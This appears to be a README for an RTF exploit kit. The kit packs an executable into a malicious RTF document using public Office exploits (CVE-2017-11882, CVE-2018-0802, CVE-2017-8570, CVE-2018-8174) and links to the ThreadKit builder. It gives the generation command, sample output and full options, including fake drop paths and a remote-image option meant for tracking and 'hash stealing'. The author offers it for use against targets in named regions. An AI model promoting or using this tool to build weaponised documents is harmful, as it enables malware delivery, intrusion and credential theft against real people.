My RTF exploit kit from a couple of years ago. You're on your own for AV
evasion. Still works well against certain targets. Especially in the Middle East, parts of Asia,
former Soviet bloc, etc.

Also included a copy of
the [threadkit](https://www.proofpoint.com/us/threat-insight/post/unraveling-ThreadKit-new-document-exploit-builder-distribute-The-Trick-Formbook-Loki-Bot-malware) exploit kit,
courtesy of [the
Russians](https://cyware.com/news/cobalt-gang-found-using-new-version-of-threadkit-exploit-kit-dubbed-cobint-e523901f/).
<3

rtfkit takes an executable and packs it into an RTF with some public pre-compiled exploits.

Usage
=====

Basically this:

    $ ./generate_rtf.py -p artifact.exe --out payload.rtf
    [+] adding exploit equation1 (cve-2017-11882)
    [+] adding exploit equation2 (cve-2018-0802)
    [+] adding exploit composite (cve-2017-8570)
    [.] writing rtf to payload.rtf

Full usage:

    usage: generate_rtf.py [-h] [-D] [-l] [-u USE] [--use-cve USE_CVE]
                           [--exe-name EXE_NAME] [--template TEMPLATE]
                           [--fake-path FAKE_PATH] [-o OUT]
                           [--king-shellcode KING_SHELLCODE] [--king-url KING_URL]
                           [--king-html-out KING_HTML_OUT]
                           [--composite-sct COMPOSITE_SCT]
                           [--image-track IMAGE_TRACK] [-p PACKAGE]
    
    optional arguments:
      -h, --help            show this help message and exit
      -D, --debug           enable debug
      -l, --list            list exploits and additions
      -u USE, --use USE     add exploit (see --list)
      --use-cve USE_CVE     add exploit (by CVE)
      --exe-name EXE_NAME   name for dropped EXE file (for exploits equation and
                            composite)
      --template TEMPLATE   RTF template to add exploit to (default:
                            resources/blank.rtf)
      --fake-path FAKE_PATH
                            fake path for packaged files (default: C:\Drivers)
      -o OUT, --out OUT     RTF output
    
    king exploit:
      King exploit (CVE-2018-8174) options
    
      --king-shellcode KING_SHELLCODE
                            shellcode for CVE-2018-8174 (default:
                            resources/rtf_winexec.bin)
      --king-url KING_URL   URL where HTML will be hosted for king exploit (max:
                            39 chars)
      --king-html-out KING_HTML_OUT
                            output file for king HTML
    
    composite exploit:
      Composite moniker exploit (CVE-2017-8570) options
    
      --composite-sct COMPOSITE_SCT
                            use this SCT file instead of generating one
    
    additions:
      Additional things to add to the RTF
    
      --image-track IMAGE_TRACK
                            include an image from this URL, for tracking and hash
                            stealing
      -p PACKAGE, --package PACKAGE
                            files to add as packages. will by dropped in temp
                            (append fake name with colon)
